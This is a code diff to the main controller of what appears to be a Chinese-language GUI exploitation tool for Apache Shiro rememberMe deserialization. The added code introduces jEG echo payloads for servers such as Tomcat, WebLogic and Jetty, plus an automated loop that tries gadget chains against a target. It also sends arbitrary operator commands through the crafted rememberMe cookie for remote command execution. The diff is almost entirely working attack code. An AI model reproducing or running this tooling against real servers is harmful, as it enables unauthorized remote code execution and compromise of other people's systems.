@@ -706,6 +706,16 @@ public class MainController {
         Platform.runLater(this::warnIfNotJava8);
     }
 
+    private static String extractHostFromUrl(String url) {
+        try {
+            java.net.URL u = new java.net.URL(url);
+            return u.getPort() > 0 && u.getPort() != u.getDefaultPort()
+                    ? u.getHost() + ":" + u.getPort() : u.getHost();
+        } catch (Exception e) {
+            return "127.0.0.1";
+        }
+    }
+
     public void initAttack() {
         String shiroKeyWordText = this.shiroKeyWord.getText();
         String targetAddressText = this.targetAddress.getText();
@@ -766,7 +776,7 @@ public class MainController {
         this.gadgetOpt.setPromptText("CommonsBeanutilsString");
         this.gadgetOpt.setValue("CommonsBeanutilsString");
         this.gadgetOpt.setItems(gadgets);
-        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho"});
+        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "SpringEcho", "jEG:SERVER_TOMCAT", "jEG:SERVER_SPRING_MVC", "jEG:SERVER_RESIN", "jEG:SERVER_WEBLOGIC", "jEG:SERVER_JETTY", "jEG:SERVER_WEBSPHERE", "jEG:SERVER_UNDERTOW", "jEG:SERVER_GLASSFISH"});
 //        ObservableList<String> echoes = FXCollections.observableArrayList(new String[]{"AllEcho","TomcatEcho", "TomcatEcho2", "SpringEcho"});
         this.echoOpt.setPromptText("TomcatEcho");
         this.echoOpt.setValue("TomcatEcho");
@@ -1086,7 +1096,32 @@ public class MainController {
             this.logTextArea.appendText(Utils.log("请选择利用链和回显类型"));
             return;
         }
-        boolean ok = this.attackService.gadgetCrack(gadget, echo, spcShiroKey.trim());
+        boolean ok;
+        if (echo.startsWith("jEG:")) {
+            String srv = echo.substring(4);
+            String host = extractHostFromUrl(this.attackService.url);
+            String probeCmd = "echo \"Host: " + host + "\"";
+            ok = false;
+            EchoGenerateResult jegResult = this.attackService.generateEchoWithThirdParty(
+                    "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
+                    gadget, null, spcShiroKey.trim(), probeCmd, "");
+            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                if (cookieLine != null) {
+                    String result = this.attackService.sendRememberMeCookieExploitWithCmd(cookieLine, probeCmd, true, this.logTextArea);
+                    if (AttackService.responseIndicatesGadgetHit(result)) {
+                        AttackService.attackRememberMe = cookieLine;
+                        AttackService.gadget = gadget;
+                        AttackService.jegMode = true;
+                        this.jegServerOpt.setValue(srv);
+                        this.logTextArea.appendText(Utils.log("[++] jEG 命中，gadget=" + gadget + " 服务端类型: " + srv));
+                        ok = true;
+                    }
+                }
+            }
+        } else {
+            ok = this.attackService.gadgetCrack(gadget, echo, spcShiroKey.trim());
+        }
         if (!ok) {
             this.logTextArea.appendText(Utils.log("[-] 当前利用链未命中，请尝试更换组合"));
         }
@@ -1130,7 +1165,38 @@ public class MainController {
                     String echo = parts.length > 1 ? parts[1] : "";
                     updateMessage(gadget + " / " + echo);
                     updateProgress(i, total);
-                    boolean matched = MainController.this.attackService.gadgetCrack(gadget, echo, key);
+                    boolean matched;
+                    if (echo.startsWith("jEG:")) {
+                        matched = false;
+                        try {
+                            String srv = echo.substring(4);
+                            String host = extractHostFromUrl(MainController.this.attackService.url);
+                            String probeCmd = "echo \"Host: " + host + "\"";
+                            EchoGenerateResult jegResult = MainController.this.attackService.generateEchoWithThirdParty(
+                                    "jEG", srv, "MODEL_CMD", "FORMAT_BASE64",
+                                    gadget, null, key, probeCmd, "");
+                            if (jegResult.isSuccess() && jegResult.getPayload() != null) {
+                                String cookieLine = AttackService.resolveRememberMeCookieLine(jegResult.getPayload(), jegResult.getRequestHeaderName());
+                                if (cookieLine != null) {
+                                    String result = MainController.this.attackService.sendRememberMeCookieExploitWithCmd(cookieLine, probeCmd, true, null);
+                                    if (AttackService.responseIndicatesGadgetHit(result)) {
+                                        AttackService.attackRememberMe = cookieLine;
+                                        AttackService.gadget = gadget;
+                                        AttackService.jegMode = true;
+                                        final String hitSrv = srv;
+                                        Platform.runLater(() -> {
+                                            MainController.this.logTextArea.appendText(Utils.log("[++] jEG 命中，gadget=" + gadget + " 服务端类型: " + hitSrv));
+                                            MainController.this.jegServerOpt.setValue(hitSrv);
+                                            MainController.this.gadgetOpt.setValue(gadget);
+                                        });
+                                        matched = true;
+                                    }
+                                }
+                            }
+                        } catch (Throwable ignored) {}
+                    } else {
+                        matched = MainController.this.attackService.gadgetCrack(gadget, echo, key);
+                    }
                     if (matched) {
                         updateProgress(i + 1, total);
                         updateMessage("命中: " + gadget + " / " + echo);
@@ -1226,7 +1292,13 @@ public class MainController {
             return;
         }
         try {
-            String output = this.attackService.execCmdTask(command.trim());
+            String output;
+            if (AttackService.jegMode) {
+                output = this.attackService.sendRememberMeCookieExploitWithCmd(
+                        AttackService.attackRememberMe, command.trim(), true, this.execOutputArea);
+            } else {
+                output = this.attackService.execCmdTask(command.trim());
+            }
             this.execOutputArea.appendText("[command] " + command.trim() + "\n");
             if (output == null) {
                 this.execOutputArea.appendText("[result] 目标无响应\n");
